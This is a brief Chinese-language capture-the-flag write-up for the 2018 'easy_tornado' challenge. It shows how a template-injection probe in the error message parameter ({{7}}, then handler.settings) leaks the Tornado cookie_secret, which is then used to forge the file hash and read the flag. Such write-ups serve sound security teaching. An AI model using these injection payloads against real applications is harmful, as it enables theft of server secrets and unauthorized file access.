# \[护网杯 2018]easy\_tornado

## \[护网杯 2018]easy\_tornado

## 考点

* tornado
* SSTI

## wp

上来给了三个链接

```
file?filename=/flag.txt&filehash=c5eeb6eefb2ad02d2ff06e5a66f63124
/flag.txt
flag in /fllllllllllllag

file?filename=/welcome.txt&filehash=f838084fcbaff9f5428b56518e27758d
/welcome.txt
render

file?filename=/hints.txt&filehash=b57e7ac739c0992826da2baedae10273
/hints.txt
md5(cookie_secret+md5(filename))
```

试着修改请求的链接，去掉filehash参数提示Error，此时的链接为

```
error?msg=Error
```

修改请求为`error?msg={{7}}` 看到回显7，判断存在SSTI。而在tornado中，它的`handler.settings` 模板就是当前应用的配置，直接访问就可以得到

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '6b17acff-5cf2-4382-bb17-2768465ecaa5'} 
```

得到了盐，再算/fllllllllllllag的hash即可，`file?filename=/fllllllllllllag&filehash=e49d1d331a78d133093c3f8cbb3d5bdb`

## 小结

1. tornado是Python web的一个框架
2. 对链接要敏感，增删改
